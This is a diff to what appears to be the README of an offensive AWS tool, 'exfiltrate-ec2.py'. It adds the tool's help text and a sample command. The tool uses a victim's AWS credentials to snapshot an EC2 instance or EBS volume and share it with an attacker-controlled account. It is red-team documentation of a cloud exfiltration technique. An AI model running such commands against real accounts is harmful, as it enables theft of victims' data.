@@ -103,6 +103,61 @@ IAM Permissions abused:
 - `ec2:CreateImage`
 
 ```
+attacker $ python3 ./exfiltrate-ec2.py --help
+
+        :: exfiltrate-ec2
+        Exfiltrates EC2 data by creating an image of it or snapshot of it's EBS volume
+        Mariusz B. / mgeeky '19, <mb@binary-offensive.com>
+
+usage: ./exfiltrate-ec2.py [-h] [--region REGION] [--profile PROFILE]
+                           [--access-key ACCESS_KEY] [--secret-key SECRET_KEY]
+                           [--token TOKEN] [--victim-profile VICTIM_PROFILE]
+                           [--victim-access-key VICTIM_ACCESS_KEY]
+                           [--victim-secret-key VICTIM_SECRET_KEY]
+                           [--victim-token VICTIM_TOKEN] [-v]
+                           {createimage,createsnapshot} ...
+
+positional arguments:
+  {createimage,createsnapshot}
+                        Available methods
+    createimage         Creates a snapshot of a running or stopped EC2
+                        instance in an AMI image form. This AMI image will
+                        then be shared with another AWS account, constituing
+                        exfiltration opportunity.
+    createsnapshot      Creates a snapshot of an EBS volume used by an EC2
+                        instance. This snapshot will then be shared with
+                        another AWS account, constituing exfiltration
+                        opportunity.
+
+required arguments:
+  --region REGION       AWS Region to use.
+
+optional arguments:
+  -v, --verbose         Display verbose output.
+
+Attacker's AWS credentials - where to instantiate exfiltrated EC2:
+  --profile PROFILE     Attacker's AWS Profile name to use if --access-key was
+                        not specified
+  --access-key ACCESS_KEY
+                        Attacker's AWS Access Key ID to use if --profile was
+                        not specified
+  --secret-key SECRET_KEY
+                        Attacker's AWS Secret Key ID
+  --token TOKEN         (Optional) Attacker's AWS temporary session token
+
+Victim AWS credentials - where to find EC2 to exfiltrate:
+  --victim-profile VICTIM_PROFILE
+                        Victim's AWS Profile name to use if --access-key was
+                        not specified
+  --victim-access-key VICTIM_ACCESS_KEY
+                        Victim's AWS Access Key ID to use if --profile was not
+                        specified
+  --victim-secret-key VICTIM_SECRET_KEY
+                        Victim's AWS Secret Key ID
+  --victim-token VICTIM_TOKEN
+                        (Optional) Victim's AWS temporary session token
+
+
 attacker $ python3 ./exfiltrate-ec2.py --region us-east-1 -v --profile default --victim-profile victim-profile createsnapshot --volume-id vol-0f340890acfXXXXX --attach-instance-id i-0b359b0fcbcYYYYY
 
         :: exfiltrate-ec2
